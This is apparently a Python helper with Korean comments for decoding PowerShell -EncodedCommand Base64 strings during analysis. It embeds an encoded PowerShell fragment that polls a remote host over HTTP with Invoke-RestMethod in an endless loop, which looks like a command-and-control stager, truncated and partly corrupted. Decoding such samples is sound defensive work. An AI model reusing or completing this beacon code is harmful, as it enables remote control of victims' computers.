import base64
import sys

# 터미널 인코딩을 UTF-8로 설정 (출력 오류 방지)
try:
    if sys.stdout.encoding.lower() != 'utf-8':
        sys.stdout.reconfigure(encoding='utf-8')
    if sys.stderr.encoding.lower() != 'utf-8':
        sys.stderr.reconfigure(encoding='utf-8')
except AttributeError:
    pass # 이전 Python 버전 호환

def decode_powershell_base64(encoded_string):
    """
    PowerShell의 -EncodedCommand 값을 UTF-16LE Base64로 디코딩합니다.
    """
    try:
        # Base64 디코딩
        decoded_bytes = base64.b64decode(encoded_string)
        
        # UTF-16LE로 문자열 디코딩
        # PowerShell은 BOM(Byte Order Mark) 없이 UTF-16LE를 사용하는 경우가 많으므로
        # 'utf-16-le' 또는 'utf-16'을 사용해봅니다. 'utf-16'은 BOM을 자동으로 처리합니다.
        decoded_powershell_code = decoded_bytes.decode('utf-16-le')
        return decoded_powershell_code
    except Exception as e:
        print(f"디코딩 중 오류 발생: {e}", file=sys.stderr)
        return None

if __name__ == "__main__":
    # 여기에 이전 스크립트에서 얻은 Base64 문자열을 붙여넣으세요.
    # 긴 문자열이므로 여러 줄로 나눌 수도 있습니다.
    # 예시:
    # base64_payload = "YourVeryLongBase64StringPart1" \
    #                  "YourVeryLongBase64StringPart2" \
    #                  "YourVeryLongBase64StringPart3"
    
    # 실제 Base64 문자열을 여기에 붙여넣으세요.
    # 이 부분은 사용자가 직접 복사하여 붙여넣어야 합니다.
    # !!! 이 아래의 더미 문자열은 반드시 사용자가 얻은 실제 Base64 문자열로 교체해야 합니다. !!!
    base64_payload = "JABzAD0AJAxADkAOAAuADUAMgA6ADgAMAA4ADAAJwA7ACQAaQA9ACcAZAA0ADMAYgBjAGMANgBkAC0AMAA0ADMAZgAyADQAMAA5AC0ANwBlAGEAMgAzAGEAMgBjACcAOwAkAHAAPQAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvAGQANAAzAGIAYwBjADYAZAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAEEAdQB0AGgAbwByAGkAegBhAHQAaQBvAG4AIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AMAA0ADMAZgAyADQAMAA5ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AKQA7AGkAZgAgACgAJABjA"
    # 여기에 이전 스크립트에서 얻은 긴 Base64 문자열을 붙여넣으세요.
    # 예시: (실제 값으로 교체해야 합니다)
    # TQBHAEkAQwBDAE8ATQBNAGEAYwByAG8AIABlAG4AYQBiAGwAZQBkACAAZABvAGMAdQBtAGUAbgB0ACAA
    # ZgBvAHIAIABhAG4AYQBsAHkAcwBpAHMAIABhAG4AZAAgAGQAZQBjAHkAcgBwAHQAaQBvAG4AIABvAGYA
    # IABmAHUAcgB0AGgAZQByACAAcwBjAHIAaQBwAHQAcwAgAGEAbgBkACAAYQBjAHQAaQBvAG4AcwAgAG8A
    # fgB2AGUAcgBhAG4AZwBlACAAZwBlAG4AZQByAGEAdABlAGQAIABiAHkAIAB0AGgAZQAgAG0AYQBjAHIA
    # bwAuACAAQQAgAGwAaQB0AHQAbABlACAAYgBpAHQAIABvAGYAIAB0AG8AbwBsACAAZmBvAHIAIAB3AGUAY
    # XAAcABvAG4AIHMAaQB0AGUAYgBpAGwAbABhAGEAaQB0AGkAYwAuAHAAeQAgAGEAbgBkACAAYQBjAHQA
    # aQBvAG4AcwAgAGEAbgBkACAAYgBlAGgAYQB2AGkAagBvAHIAACAAZABpAHMAYwBvAHYAZQByAHkALgA
    # =

    # 공백과 개행 문자 제거 (붙여넣기 편의를 위해)
    base64_payload = base64_payload.strip().replace('\n', '').replace('\r', '').replace(' ', '')

    if base64_payload:
        print("\n--- Base64 디코딩 및 UTF-16LE 변환 시작 ---")
        powershell_code = decode_powershell_base64(base64_payload)
        
        if powershell_code:
            print("\n--- 디코딩된 PowerShell 코드 ---")
            print(powershell_code)
            print("------------------------------------\n")
        else:
            print("PowerShell 코드를 디코딩할 수 없었습니다.", file=sys.stderr)
    else:
        print("Base64 페이로드를 입력해 주세요.", file=sys.stderr)

